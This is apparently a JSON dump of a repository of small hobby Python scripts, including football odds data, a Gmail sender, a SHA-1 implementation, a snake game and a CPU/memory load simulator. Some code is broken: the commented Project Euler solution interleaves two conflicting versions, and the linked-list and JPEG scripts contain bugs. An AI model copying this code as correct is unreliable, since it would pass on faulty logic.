3,3.75,3.55,2.8,2.7,37,1.75,1.69,2.25,2.15,19,0,1.92,1.87,2.05,1.99,2.58,3.52,2.83\r\nSP1,18/05/2019,Levante,Ath Madrid,2,2,D,2,0,H,17,17,7,8,9,7,6,4,0,1,0,1,3.75,3.75,1.95,3.5,3.75,2,3.55,3.8,1.97,3.67,3.87,2.02,3.6,3.8,1.95,3.6,3.8,2.05,38,3.75,3.55,3.9,3.78,2.05,2,36,1.71,1.65,2.31,2.23,18,0.5,1.91,1.87,2.04,1.99,4.34,4.1,1.81\r\nSP1,18/05/2019,Sevilla,Ath Bilbao,2,0,H,1,0,H,9,9,3,1,14,19,2,3,4,2,0,0,1.85,3.4,4.33,1.87,3.4,4.6,1.87,3.4,4.6,1.9,3.42,4.81,1.85,3.3,4.6,1.93,3.5,4.2,38,1.93,1.87,3.5,3.4,4.9,4.59,36,1.81,1.74,2.16,2.08,19,-1,2.7,2.6,1.6,1.53,2.17,3.08,4.15\r\nSP1,18/05/2019,Valladolid,Valencia,0,2,A,0,1,A,19,9,4,6,12,10,8,2,1,3,0,0,8,5.25,1.36,8,4.75,1.4,7.5,4.85,1.4,8.05,4.91,1.42,8.5,4.8,1.38,8,5.2,1.4,38,8.6,7.8,5.25,4.84,1.42,1.4,36,1.69,1.63,2.33,2.25,20,1.5,1.78,1.74,2.2,2.13,8.01,5.13,1.4\r\nSP1,19/05/2019,Eibar,Barcelona,2,2,D,2,2,D,15,6,8,3,11,3,5,2,4,2,0,0,3.6,4,1.9,3.7,4.1,1.87,3.75,4,1.87,3.83,4.2,1.89,3.7,4,1.88,3.7,4.1,1.87,39,3.85,3.73,4.2,4.03,1.94,1.88,37,1.5,1.46,2.85,2.65,19,0.5,2.03,1.98,1.92,1.88,4.96,4.55,1.65\r\nSP1,19/05/2019,Real Madrid,Betis,0,2,A,0,0,D,9,9,2,7,17,11,1,5,4,1,0,0,1.57,4.75,4.75,1.57,4.75,5,1.6,4.55,4.95,1.59,5.09,4.86,1.57,4.8,4.8,1.57,4.8,5.25,38,1.62,1.58,5.09,4.73,5.25,4.91,29,1.33,1.3,3.7,3.42,23,-1,1.94,1.91,2.01,1.98,1.33,6.38,8.09\r\n"
        },
        {
          "name": "send_message_automation",
          "type": "tree",
          "content": null
        },
        {
          "name": "sendemail.py",
          "type": "blob",
          "size": 4.7353515625,
          "content": "from __future__ import print_function\n\nimport base64\nimport mimetypes\nimport os\nfrom email.mime.audio import MIMEAudio\nfrom email.mime.base import MIMEBase\nfrom email.mime.image import MIMEImage\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.text import MIMEText\n\nimport httplib2\nimport oauth2client\nfrom apiclient import errors, discovery\nfrom oauth2client import client, tools\n\nSCOPES = \"https://www.googleapis.com/auth/gmail.send\"\nCLIENT_SECRET_FILE = \"client_secret.json\"\nAPPLICATION_NAME = \"Gmail API Python Send Email\"\n\n\ndef get_credentials():\n    home_dir = os.path.expanduser(\"~\")\n    credential_dir = os.path.join(home_dir, \".credentials\")\n    if not os.path.exists(credential_dir):\n        os.makedirs(credential_dir)\n    credential_path = os.path.join(credential_dir, \"gmail-python-email-send.json\")\n    store = oauth2client.file.Storage(credential_path)\n    credentials = store.get()\n    if not credentials or credentials.invalid:\n        flow = client.flow_from_clientsecrets(CLIENT_SECRET_FILE, SCOPES)\n        flow.user_agent = APPLICATION_NAME\n        credentials = tools.run_flow(flow, store)\n\n        print(\"Storing credentials to \" + credential_path)\n\n    return credentials\n\n\ndef SendMessage(sender, to, subject, msgHtml, msgPlain, attachmentFile=None):\n    credentials = get_credentials()\n    http = credentials.authorize(httplib2.Http())\n    service = discovery.build(\"gmail\", \"v1\", http=http)\n    if attachmentFile:\n        message1 = createMessageWithAttachment(\n            sender, to, subject, msgHtml, msgPlain, attachmentFile\n        )\n    else:\n        message1 = CreateMessageHtml(sender, to, subject, msgHtml, msgPlain)\n    result = SendMessageInternal(service, \"me\", message1)\n    return result\n\n\ndef SendMessageInternal(service, user_id, message):\n    try:\n        message = (\n            service.users().messages().send(userId=user_id, body=message).execute()\n        )\n\n        print(\"Message Id: %s\" % message[\"id\"])\n\n        return message\n    except errors.HttpError as error:\n        print(\"An error occurred: %s\" % error)\n        return \"Error\"\n    return \"OK\"\n\n\ndef createMessageWithAttachment(sender, to, subject, msgHtml, msgPlain, attachmentFile):\n    \"\"\"Create a message for an email.\n\n    Args:\n        sender: Email address of the sender.\n        to: Email address of the receiver.\n        subject: The subject of the email message.\n        msgHtml: Html message to be sent\n        msgPlain: Alternative plain text message for older email clients\n        attachmentFile: The path to the file to be attached.\n\n    Returns:\n        An object containing a base64url encoded email object.\n    \"\"\"\n    message = MIMEMultipart(\"mixed\")\n    message[\"to\"] = to\n    message[\"from\"] = sender\n    message[\"subject\"] = subject\n\n    messageA = MIMEMultipart(\"alternative\")\n    messageR = MIMEMultipart(\"related\")\n\n    messageR.attach(MIMEText(msgHtml, \"html\"))\n    messageA.attach(MIMEText(msgPlain, \"plain\"))\n    messageA.attach(messageR)\n\n    message.attach(messageA)\n\n    print(\"create_message_with_attachment: file:\", attachmentFile)\n    content_type, encoding = mimetypes.guess_type(attachmentFile)\n\n    if content_type is None or encoding is not None:\n        content_type = \"application/octet-stream\"\n    main_type, sub_type = content_type.split(\"/\", 1)\n    if main_type == \"text\":\n        fp = open(attachmentFile, \"rb\")\n        msg = MIMEText(fp.read(), _subtype=sub_type)\n        fp.close()\n    elif main_type == \"image\":\n        fp = open(attachmentFile, \"rb\")\n        msg = MIMEImage(fp.read(), _subtype=sub_type)\n        fp.close()\n    elif main_type == \"audio\":\n        fp = open(attachmentFile, \"rb\")\n        msg = MIMEAudio(fp.read(), _subtype=sub_type)\n        fp.close()\n    else:\n        fp = open(attachmentFile, \"rb\")\n        msg = MIMEBase(main_type, sub_type)\n        msg.set_payload(fp.read())\n        fp.close()\n    filename = os.path.basename(attachmentFile)\n    msg.add_header(\"Content-Disposition\", \"attachment\", filename=filename)\n    message.attach(msg)\n\n    return {\"raw\": base64.urlsafe_b64encode(message.as_string())}\n\n\ndef CreateMessageHtml(sender, to, subject, msgHtml, msgPlain):\n    msg = MIMEMultipart(\"alternative\")\n    msg[\"Subject\"] = subject\n    msg[\"From\"] = sender\n    msg[\"To\"] = to\n    msg.attach(MIMEText(msgPlain, \"plain\"))\n    msg.attach(MIMEText(msgHtml, \"html\"))\n    return {\"raw\": base64.urlsafe_b64encode(msg.as_string())}\n\n\ndef main():\n    to = input(\"Enter Email Address: \")\n    sender = input(\"Your Mail ID: \")\n    subject = input(\"Enter your Subject: \")\n    msgHtml = input(\"Enter your Message: \")\n    msgPlain = \"Hi\\nPlain Email\"\n    SendMessage(sender, to, subject, msgHtml, msgPlain)\n    # Send message with attachment:\n    # SendMessage(sender, to, subject, msgHtml, msgPlain, '/path/to/file.pdf')\n\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "sensors_information.py",
          "type": "blob",
          "size": 1.15625,
          "content": "import argparse\nimport sys\nimport socket\nimport psutil\n\n\ndef python_version():\n    return sys.version_info\n\n\ndef ip_addresses():\n    hostname = socket.gethostname()\n    addresses = socket.getaddrinfo(hostname, None)\n\n    address_info = []\n    for address in addresses:\n        address_info.append((address[0].name, address[4][0]))\n    return address_info\n\n\ndef cpu_load():\n    return psutil.cpu_percent(interval=0.1)\n\n\ndef ram_available():\n    return psutil.virtual_memory().available\n\n\ndef ac_connected():\n    return psutil.sensors_battery().power_plugged\n\n\ndef show_sensors():\n    print(\"Python Version:{0.major}.{0.minor}\".format(python_version()))\n    for address in ip_addresses():\n        print(\"IP Addresses: {0[1]} ({0[0]})\".format(address))\n    print(\"CPU Load: {:.1f}\".format(cpu_load()))\n    print(\"RAM Available: {} MiB\".format(ram_available() / 1024 ** 2))\n    print(\"AC Connected: {}\".format(ac_connected()))\n\n\ndef command_line(argv):\n    parser = argparse.ArgumentParser(\n        description=\"Display the values of the sensors\",\n        add_help=True,\n    )\n    arguments = parser.parse_args()\n    show_sensors()\n\n\nif __name__ == \"__main__\":\n    command_line(sys.argv)\n"
        },
        {
          "name": "serial_scanner.py",
          "type": "blob",
          "size": 1.6875,
          "content": "import sys\n\nimport serial\n\n\n# A serial port-scanner for linux and windows platforms\n\n# Author: Julio César Echeverri Marulanda\n# e-mail: julio.em7@gmail.com\n# blog:   blogdelingeniero1.wordpress.com\n\n# You should have installed the PySerial module to use this method.\n\n# You can install pyserial with the following line:      pip install pyserial\n\n\ndef ListAvailablePorts():\n    # This function return a list containing the string names for Virtual Serial Ports\n    # availables in the computer (this function works only for Windows & Linux Platforms but you can extend it)\n    # if there isn't available ports, returns an empty List\n    AvailablePorts = []\n    platform = sys.platform\n    if platform == \"win32\":\n        for i in range(255):\n            try:\n                ser = serial.Serial(i, 9600)\n            except serial.serialutil.SerialException:\n                pass\n            else:\n                AvailablePorts.append(ser.portstr)\n                ser.close()\n\n    elif platform == \"linux\":\n        for i in range(0, 255):\n            try:\n                ser = serial.Serial(\"/dev/ttyUSB\" + str(i))\n            except serial.serialutil.SerialException:\n                pass\n            else:\n                AvailablePorts.append(\"/dev/ttyUSB\" + str(i))\n                ser.close()\n    else:\n        print(\n            \"\"\"This method was developed only for linux and windows\n                the current platform isn't recognised\"\"\"\n        )\n    if len(AvailablePorts) == 0:\n        print(\"NO port in use\")\n        return 0\n    else:\n        return AvailablePorts\n\n\n#  EXAMPLE OF HOW IT WORKS\n\n#  if an Arduino is connected to the computer, the port will be show in the terminal\n#  print ListAvailablePorts()\n"
        },
        {
          "name": "sha1.py",
          "type": "blob",
          "size": 4.6962890625,
          "content": "import argparse\nimport hashlib  # hashlib is only used inside the Test class\nimport struct\nimport unittest\n\n\nclass SHA1Hash:\n    \"\"\"\n    Class to contain the entire pipeline for SHA1 Hashing Algorithm\n    \"\"\"\n\n    def __init__(self, data):\n        \"\"\"\n        Inititates the variables data and h. h is a list of 5 8-digit Hexadecimal\n        numbers corresponding to (1732584193, 4023233417, 2562383102, 271733878, 3285377520)\n        respectively. We will start with this as a message digest. 0x is how you write\n        Hexadecimal numbers in Python\n        \"\"\"\n        self.data = data\n        self.h = [0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476, 0xC3D2E1F0]\n\n    @staticmethod\n    def rotate(n, b):\n        \"\"\"\n        Static method to be used inside other methods. Left rotates n by b.\n        \"\"\"\n        return ((n << b) | (n >> (32 - b))) & 0xFFFFFFFF\n\n    def padding(self):\n        \"\"\"\n        Pads the input message with zeros so that padded_data has 64 bytes or 512 bits\n        \"\"\"\n        padding = b\"\\x80\" + b\"\\x00\" * (63 - (len(self.data) + 8) % 64)\n        padded_data = self.data + padding + struct.pack(\">Q\", 8 * len(self.data))\n        return padded_data\n\n    def split_blocks(self):\n        \"\"\"\n        Returns a list of bytestrings each of length 64\n        \"\"\"\n        return [\n            self.padded_data[i : i + 64] for i in range(0, len(self.padded_data), 64)\n        ]\n\n    # @staticmethod\n    def expand_block(self, block):\n        \"\"\"\n        Takes a bytestring-block of length 64, unpacks it to a list of integers and returns a\n        list of 80 integers pafter some bit operations\n        \"\"\"\n        w = list(struct.unpack(\">16L\", block)) + [0] * 64\n        for i in range(16, 80):\n            w[i] = self.rotate((w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16]), 1)\n        return w\n\n    def final_hash(self):\n        \"\"\"\n        Calls all the other methods to process the input. Pads the data, then splits into\n        blocks and then does a series of operations for each block (including expansion).\n        For each block, the variable h that was initialized is copied to a,b,c,d,e\n        and these 5 variables a,b,c,d,e undergo several changes. After all the blocks are\n        processed, these 5 variables are pairwise added to h ie a to h[0], b to h[1] and so on.\n        This h becomes our final hash which is returned.\n        \"\"\"\n        self.padded_data = self.padding()\n        self.blocks = self.split_blocks()\n        for block in self.blocks:\n            expanded_block = self.expand_block(block)\n            a, b, c, d, e = self.h\n            for i in range(0, 80):\n                if 0 <= i < 20:\n                    f = (b & c) | ((~b) & d)\n                    k = 0x5A827999\n                elif 20 <= i < 40:\n                    f = b ^ c ^ d\n                    k = 0x6ED9EBA1\n                elif 40 <= i < 60:\n                    f = (b & c) | (b & d) | (c & d)\n                    k = 0x8F1BBCDC\n                elif 60 <= i < 80:\n                    f = b ^ c ^ d\n                    k = 0xCA62C1D6\n                a, b, c, d, e = (\n                    self.rotate(a, 5) + f + e + k + expanded_block[i] & 0xFFFFFFFF,\n                    a,\n                    self.rotate(b, 30),\n                    c,\n                    d,\n                )\n        self.h = (\n            self.h[0] + a & 0xFFFFFFFF,\n            self.h[1] + b & 0xFFFFFFFF,\n            self.h[2] + c & 0xFFFFFFFF,\n            self.h[3] + d & 0xFFFFFFFF,\n            self.h[4] + e & 0xFFFFFFFF,\n        )\n        return \"%08x%08x%08x%08x%08x\" % tuple(self.h)\n\n\nclass SHA1HashTest(unittest.TestCase):\n    \"\"\"\n    Test class for the SHA1Hash class. Inherits the TestCase class from unittest\n    \"\"\"\n\n    def testMatchHashes(self):\n        msg = bytes(\"Test String\", \"utf-8\")\n        self.assertEqual(SHA1Hash(msg).final_hash(), hashlib.sha1(msg).hexdigest())\n\n\ndef main():\n    \"\"\"\n    Provides option 'string' or 'file' to take input and prints the calculated SHA1 hash.\n    unittest.main() has been commented because we probably dont want to run\n    the test each time.\n    \"\"\"\n    # unittest.main()\n    parser = argparse.ArgumentParser(description=\"Process some strings or files\")\n    parser.add_argument(\n        \"--string\",\n        dest=\"input_string\",\n        default=\"Hello World!! Welcome to Cryptography\",\n        help=\"Hash the string\",\n    )\n    parser.add_argument(\"--file\", dest=\"input_file\", help=\"Hash contents of a file\")\n    args = parser.parse_args()\n    input_string = args.input_string\n    # In any case hash input should be a bytestring\n    if args.input_file:\n        hash_input = open(args.input_file, \"rb\").read()\n    else:\n        hash_input = bytes(input_string, \"utf-8\")\n    print(SHA1Hash(hash_input).final_hash())\n\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "sierpinski_triangle.py",
          "type": "blob",
          "size": 2.1123046875,
          "content": "\"\"\"Author Anurag Kumar | anuragkumarak95@gmail.com | git/anuragkumarak95\n\nSimple example of Fractal generation using recursive function.\n\nWhat is Sierpinski Triangle?\n>>The Sierpinski triangle (also with the original orthography Sierpinski), also called the Sierpinski gasket or the Sierpinski Sieve, \nis a fractal and attractive fixed set with the overall shape of an equilateral triangle, subdivided recursively into smaller \nequilateral triangles. Originally constructed as a curve, this is one of the basic examples of self-similar sets, i.e., \nit is a mathematically generated pattern that can be reproducible at any magnification or reduction. It is named after \nthe Polish mathematician Wacław Sierpinski, but appeared as a decorative pattern many centuries prior to the work of Sierpinski.\n\nRequirements(pip):\n  - turtle\n\nPython:\n  - 2.6\n\nUsage:\n  - $python sierpinski_triangle.py <int:depth_for_fractal>\n\nCredits: This code was written by editing the code from http://www.lpb-riannetrujillo.com/blog/python-fractal/\n\n\"\"\"\nimport sys\nimport turtle\n\nPROGNAME = \"Sierpinski Triangle\"\nif len(sys.argv) != 2:\n    raise Exception(\n        \"right format for using this script: $python fractals.py <int:depth_for_fractal>\"\n    )\n\nmyPen = turtle.Turtle()\nmyPen.ht()\nmyPen.speed(5)\nmyPen.pencolor(\"red\")\n\npoints = [[-175, -125], [0, 175], [175, -125]]  # size of triangle\n\n\ndef getMid(p1, p2):\n    return ((p1[0] + p2[0]) / 2, (p1[1] + p2[1]) / 2)  # find midpoint\n\n\ndef triangle(points, depth):\n    myPen.up()\n    myPen.goto(points[0][0], points[0][1])\n    myPen.down()\n    myPen.goto(points[1][0], points[1][1])\n    myPen.goto(points[2][0], points[2][1])\n    myPen.goto(points[0][0], points[0][1])\n\n    if depth > 0:\n        triangle(\n            [points[0], getMid(points[0], points[1]), getMid(points[0], points[2])],\n            depth - 1,\n        )\n        triangle(\n            [points[1], getMid(points[0], points[1]), getMid(points[1], points[2])],\n            depth - 1,\n        )\n        triangle(\n            [points[2], getMid(points[2], points[1]), getMid(points[0], points[2])],\n            depth - 1,\n        )\n\n\ntriangle(points, int(sys.argv[1]))\n"
        },
        {
          "name": "simpleInterest.py",
          "type": "blob",
          "size": 0.2333984375,
          "content": "principle = float(input(\"Enter the principle amount:\"))\ntime = int(input(\"Enter the time(years):\"))\nrate = float(input(\"Enter the rate:\"))\nsimple_interest = (principle * time * rate) / 100\nprint(\"The simple interest is:\", simple_interest)\n"
        },
        {
          "name": "simple_calculator",
          "type": "tree",
          "content": null
        },
        {
          "name": "simulate_memory_cpu.py",
          "type": "blob",
          "size": 1.6259765625,
          "content": "#! /user/bin/env python\n# -*- encoding: utf-8 -*-\n\"\"\"\nSimulate cpu、 memory usage\n\"\"\"\n\nimport sys\nimport re\nimport time\nfrom multiprocessing import Process, cpu_count\n\n\ndef print_help():\n    print('Usage: ')\n    print('  python cpu_memory_simulator.py m 1GB')\n    print('  python cpu_memory_simulator.py c 1')\n    print('  python cpu_memory_simulator.py mc 1GB 2')\n\n# memory usage\n\n\ndef mem():\n    pattern = re.compile('^(\\d*)([M|G]B)$')\n    size = sys.argv[2].upper()\n    match = pattern.match(size)\n    if match:\n        num = int(match.group(1))\n        unit = match.group(2)\n        if unit == 'MB':\n            s = ' ' * (num * 1024 * 1024)\n        else:\n            s = ' ' * (num * 1024 * 1024 * 1024)\n        time.sleep(24 * 3600)\n    else:\n        print(\"bad args.....\")\n        print_help()\n\n# cpu usage\n\n\ndef deadloop():\n    while True:\n        pass\n\n# Specify how many cores to occupy according to the parameters\n\n\ndef cpu():\n    arg = sys.argv[2] if len(sys.argv) == 3 else sys.argv[3]\n    cpu_num = cpu_count()\n    cores = int(arg)\n    if not isinstance(cores, int):\n        print(\"bad args not int\")\n        return\n\n    if cores > cpu_num:\n        print(\"Invalid CPU Num(cpu_count=\"+str(cpu_num)+\")\")\n        return\n\n    if cores is None or cores < 1:\n        cores = 1\n\n    for i in range(cores):\n        Process(target=deadloop).start()\n\n\ndef mem_cpu():\n    Process(target=mem).start()\n    Process(target=cpu).start()\n\n\nif __name__ == \"__main__\":\n    if len(sys.argv) >= 3:\n        switcher = {\n            'm': mem,\n            'c': cpu,\n            'mc': mem_cpu\n        }\n        switcher.get(sys.argv[1], mem)()\n    else:\n        print_help()\n"
        },
        {
          "name": "singly_linked_list.py",
          "type": "blob",
          "size": 2.5673828125,
          "content": "class Node:\n    def __init__(self, data):\n        self.data = data\n        self.next = None\n\nclass LinkedList():\n    def __init__(self):\n        self.head = None\n\n    def length(self):\n        curr = self.head\n        count = 0\n        while curr.next != None:\n            count += 1\n            curr = curr.next\n        return count\n\n    def add_node(self, data):\n        new_node = Node(data)\n        if self.head is None:\n            self.head = new_node\n        else:\n            curr = self.head\n            while curr.next != None:\n                curr = curr.next\n            curr.next = new_node\n\n    def insert_at_head(self, data):\n        new_node = Node(data)\n        temp = self.head\n        self.head = new_node\n        new_node.next = temp\n        del temp\n\n    def insert(self, pos, data):\n        if pos < 0 or pos > self.length():\n            print(\"Enter valid index\")\n        elif pos == 0:\n            self.insert_at_head(data)\n            return\n        elif pos == self.length()-1:\n            self.add_node(data)\n            return\n        new_node = Node(data)\n        curr_pos = 0\n        prev = None\n        curr = self.head\n        while True:\n            if pos == curr_pos:\n                prev.next = new_node\n                new_node.next = curr\n                break\n            prev = curr\n            curr = curr.next\n            curr_pos += 1\n        \n    def delete_head(self):\n        temp = self.head\n        self.head = temp.next\n        del temp\n    \n    def delete_end(self):\n        curr = self.head\n        prev = None\n        while True:\n            if curr.next == None:\n                prev.next = None\n                del curr\n                break\n            prev = curr\n            curr = curr.next\n\n    def delete(self, pos):\n        if pos < 0 or pos > self.length():\n            print(\"Enter valid index\")\n            return\n        elif pos == 0:\n            self.delete_head()\n            return\n        elif pos == self.length()-1:\n            self.delete_end()\n            return\n        curr = self.head\n        curr_pos = 0\n        prev = None\n        while True:\n            if curr_pos == pos:\n                prev.next = curr.next\n                del curr\n                break\n            prev = curr\n            curr = curr.next\n            curr_pos += 1\n\n    def display(self):\n        if self.head is None:\n            print(\"List is empty\")\n        rev = []\n        curr = self.head\n        while curr != None:\n            print(f\"{curr.data} --> \", end='')\n            rev.append(curr.data)\n            curr = curr.next\n        print()\n        return rev[::-1]\n"
        },
        {
          "name": "size(resolution)image.py",
          "type": "blob",
          "size": 0.6044921875,
          "content": "def jpeg_res(filename):\n    \"\"\" \"This function prints the resolution of the jpeg image file passed into it\"\"\"\n\n    # open image for reading in binary mode\n    with open(filename, \"rb\") as img_file:\n\n        # height of image (in 2 bytes) is at 164th position\n        img_file.seek(163)\n\n        # read the 2 bytes\n        a = img_file.read(2)\n\n        # calculate height\n        height = (a[0] << 8) + a[1]\n\n        # next 2 bytes is width\n        a = img_file.read(2)\n\n        # calculate width\n        width = (a[0] << 8) + a[1]\n\n    print(\"The resolution of the image is\", width, \"x\", height)\n\n\njpeg_res(\"img1.jpg\")\n"
        },
        {
          "name": "slack_message.py",
          "type": "blob",
          "size": 0.7119140625,
          "content": "from __future__ import print_function\n\n# Created by sarathkaul on 11/11/19\n\nimport json\nimport urllib.request\n\n# Set the webhook_url to the one provided by Slack when you create the webhook at https://my.slack.com/services/new/incoming-webhook/\nwebhook_url = (\n    \"https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX\"\n)\nslack_data = {\"text\": \"Hi Sarath Kaul\"}\n\nresponse = urllib.request.Request(\n    webhook_url,\n    data=json.dumps(slack_data),\n    headers={\"Content-Type\": \"application/json\"},\n)\nprint(response)\n# if response.status_code != 200:\n#     raise ValueError(\n#         'Request to slack returned an error %s, the response is:\\n%s'\n#         % (response.status_code, response.text)\n#     )\n"
        },
        {
          "name": "snake.py",
          "type": "blob",
          "size": 3.8369140625,
          "content": "# SNAKES GAME\n# Use ARROW KEYS to play, SPACE BAR for pausing/resuming and Esc Key for exiting\n# Original Author : Sanchit Gangwar\n# Modified by : Rayan Dutta\n# Minor changes made to keep the game working.\n\ntry:\n    import curses\n    from time import sleep\n    from curses import KEY_RIGHT, KEY_LEFT, KEY_UP, KEY_DOWN\n    from random import randint\n\n    print(\n        \"Use the arrow keys to move, press the space bar to pause, and press ESC to quit\"\n    )\n    sleep(1)\n    key = KEY_RIGHT  # Initializing values\n    curses.initscr()\n    win = curses.newwin(20, 60, 0, 0)\n    win.keypad(1)\n    curses.noecho()\n    curses.curs_set(0)\n    win.border(0)\n    win.nodelay(1)\n    x, y = win.getmaxyx()\n    key = KEY_DOWN  # Initializing values\n    score = 0\n    s = open(\".snake_highscore.txt\", \"r\")\n    hscore = s.read()\n    s.close()\n    snake = [[4, 10], [4, 9], [4, 8]]  # Initial snake co-ordinates\n    food = [10, 20]  # First food co-ordinates\n\n    win.addch(food[0], food[1], \"*\")  # Prints or shows the food\n\n    while key != 27:  # While Esc key is not pressed\n        win.border(0)\n        win.addstr(0, 2, \"Score : \" + str(score) + \" \")  # Printing 'Score' and\n        win.addstr(0, 27, \" SNAKE \")  # 'SNAKE' strings\n        win.addstr(0, 37, \"Highscore: \" + str(hscore) + \" \")\n\n        win.timeout(\n            int(150 - (len(snake) / 5 + len(snake) / 10) % 120)\n        )  # Increases the speed of Snake as its length increases\n\n        prevKey = key  # Previous key pressed\n        event = win.getch()\n        key = key if event == -1 else event\n\n        if key == ord(\" \"):  # If SPACE BAR is pressed, wait for another\n            key = -1  # one (Pause/Resume)\n            win.addstr(0, 40, \"PAUSED\")\n            while key != ord(\" \"):\n                key = win.getch()\n            key = prevKey\n            continue\n\n        if key not in [\n            KEY_LEFT,\n            KEY_RIGHT,\n            KEY_UP,\n            KEY_DOWN,\n            27,\n        ]:  # If an invalid key is pressed\n            key = prevKey\n\n        # Calculates the new coordinates of the head of the snake. NOTE: len(snake) increases.\n        # This is taken care of later at [1].\n        snake.insert(\n            0,\n            [\n                snake[0][0] + (key == KEY_DOWN and 1) + (key == KEY_UP and -1),\n                snake[0][1] + (key == KEY_LEFT and -1) + (key == KEY_RIGHT and 1),\n            ],\n        )\n\n        # If snake crosses the boundaries, make it enter from the other side\n        if snake[0][0] == 0:\n            snake[0][0] = 18\n        if snake[0][1] == 0:\n            snake[0][1] = 58\n        if snake[0][0] == 19:\n            snake[0][0] = 1\n        if snake[0][1] == 59:\n            snake[0][1] = 1\n\n        # Exit if snake crosses the boundaries (Uncomment to enable)\n        # if snake[0][0] == 0 or snake[0][0] == 19 or snake[0][1] == 0 or snake[0][1] == 59: break\n\n        # If snake runs over itself\n        if snake[0] in snake[1:]:\n            break\n\n        if snake[0] == food:  # When snake eats the food\n            food = []\n            score += 1\n            while food == []:\n                food = [\n                    randint(1, 18),\n                    randint(1, 58),\n                ]  # Calculating next food's coordinates\n                if food in snake:\n                    food = []\n            win.addch(food[0], food[1], \"*\")\n        else:\n            last = snake.pop()  # [1] If it does not eat the food, length decreases\n            win.addch(last[0], last[1], \" \")\n        win.addch(snake[0][0], snake[0][1], \"#\")\n\n\nexcept KeyboardInterrupt or EOFError:\n    curses.endwin()\n    print(\"Score - \" + str(score))\n    if score > int(hscore):\n        s = open(\".snake_highscore.txt\", \"w\")\n        s.write(str(score))\n        s.close()\n\ncurses.endwin()\nif score > int(hscore):\n    s = open(\".snake_highscore.txt\", \"w\")\n    s.write(str(score))\n    s.close()\nprint(\"Score - \" + str(score))\n"
        },
        {
          "name": "snake_case_renamer_depth_one.py",
          "type": "blob",
          "size": 2.3408203125,
          "content": "import os\nimport argparse\nfrom typing import Union\n\ndef generate_unique_name(directory: str, name: str) -> str:\n    \"\"\"\n    Generate a unique name for a file or folder in the specified directory.\n\n    Parameters:\n    ----------\n    directory : str\n        The path to the directory.\n    name : str\n        The name of the file or folder.\n\n    Returns:\n    -------\n    str\n        The unique name with an index.\n    \"\"\"\n    base_name, extension = os.path.splitext(name)\n    index = 1\n    while os.path.exists(os.path.join(directory, f\"{base_name}_{index}{extension}\")):\n        index += 1\n    return f\"{base_name}_{index}{extension}\"\n\ndef rename_files_and_folders(directory: str) -> None:\n    \"\"\"\n    Rename files and folders in the specified directory to lowercase with underscores.\n\n    Parameters:\n    ----------\n    directory : str\n        The path to the directory containing the files and folders to be renamed.\n\n    Returns:\n    -------\n    None\n    \"\"\"\n    if not os.path.isdir(directory):\n        raise ValueError(\"Invalid directory path.\")\n\n    for name in os.listdir(directory):\n        old_path = os.path.join(directory, name)\n        new_name = name.lower().replace(\" \", \"_\")\n        new_path = os.path.join(directory, new_name)\n\n        # Check if the new filename is different from the old filename\n        if new_name != name:\n            # Check if the new filename already exists in the directory\n            if os.path.exists(new_path):\n                # If the new filename exists, generate a unique name with an index\n                new_path = generate_unique_name(directory, new_name)\n\n            os.rename(old_path, new_path)\n\ndef main() -> None:\n    \"\"\"\n    Main function to handle command-line arguments and call the renaming function.\n\n    Usage:\n    ------\n    python script_name.py <directory_path>\n\n    Example:\n    --------\n    python rename_files_script.py /path/to/directory\n\n    \"\"\"\n    # Create a parser for command-line arguments\n    parser = argparse.ArgumentParser(description=\"Rename files and folders to lowercase with underscores.\")\n    parser.add_argument(\"directory\", type=str, help=\"Path to the directory containing the files and folders to be renamed.\")\n    args = parser.parse_args()\n\n    # Call the rename_files_and_folders function with the provided directory path\n    rename_files_and_folders(args.directory)\n\nif __name__ == \"__main__\":\n    main()\n"
        },
        {
          "name": "socket-programming",
          "type": "tree",
          "content": null
        },
        {
          "name": "solution to euler project problem 10.py",
          "type": "blob",
          "size": 2.521484375,
          "content": "##author-slayking1965\n# \"\"\"\n# https://projecteuler.net/problem=10\n# Problem Statement:\n# The sum of the primes below 10 is 2 + 3 + 5 + 7 = 17.\n# Find the sum of all the primes below two million using Sieve_of_Eratosthenes:\n# The sieve of Eratosthenes is one of the most efficient ways to find all primes\n# smaller than n when n is smaller than 10 million.  Only for positive numbers.\n# Find the sum of all the primes below two million.\n# \"\"\"\n\n\n# def prime_sum(n: int) -> int:\n#    \"\"\"Returns the sum of all the primes below n.\n# def solution(n: int = 2000000) -> int:\n#    \"\"\"Returns the sum of all the primes below n using Sieve of Eratosthenes:\n#    https://en.wikipedia.org/wiki/Sieve_of_Eratosthenes\n#    The sieve of Eratosthenes is one of the most efficient ways to find all primes\n#    smaller than n when n is smaller than 10 million.  Only for positive numbers.\n#    >>> prime_sum(2_000_000)\n#    >>> solution(2_000_000)\n#    142913828922\n#    >>> prime_sum(1_000)\n#    >>> solution(1_000)\n#    76127\n#    >>> prime_sum(5_000)\n#    >>> solution(5_000)\n#    1548136\n#    >>> prime_sum(10_000)\n#    >>> solution(10_000)\n#    5736396\n#    >>> prime_sum(7)\n#    >>> solution(7)\n#    10\n#    >>> prime_sum(7.1)  # doctest: +ELLIPSIS\n#    >>> solution(7.1)  # doctest: +ELLIPSIS\n#    Traceback (most recent call last):\n#    ...\n#    TypeError: 'float' object cannot be interpreted as an integer\n#    >>> prime_sum(-7)  # doctest: +ELLIPSIS\n#    >>> solution(-7)  # doctest: +ELLIPSIS\n#    Traceback (most recent call last):\n#    ...\n#    IndexError: list assignment index out of range\n#    >>> prime_sum(\"seven\")  # doctest: +ELLIPSIS\n#    >>> solution(\"seven\")  # doctest: +ELLIPSIS\n#    Traceback (most recent call last):\n#    ...\n#    TypeError: can only concatenate str (not \"int\") to str\n#    \"\"\"\n#    list_ = [0 for i in range(n + 1)]\n#    list_[0] = 1\n#    list_[1] = 1\n#    primality_list = [0 for i in range(n + 1)]\n#    primality_list[0] = 1\n#    primality_list[1] = 1\n\n#    for i in range(2, int(n ** 0.5) + 1):\n#        if list_[i] == 0:\n#        if primality_list[i] == 0:\n#            for j in range(i * i, n + 1, i):\n#                list_[j] = 1\n#    s = 0\n#                primality_list[j] = 1\n#    sum_of_primes = 0\n#    for i in range(n):\n#        if list_[i] == 0:\n#            s += i\n#    return s\n#        if primality_list[i] == 0:\n#            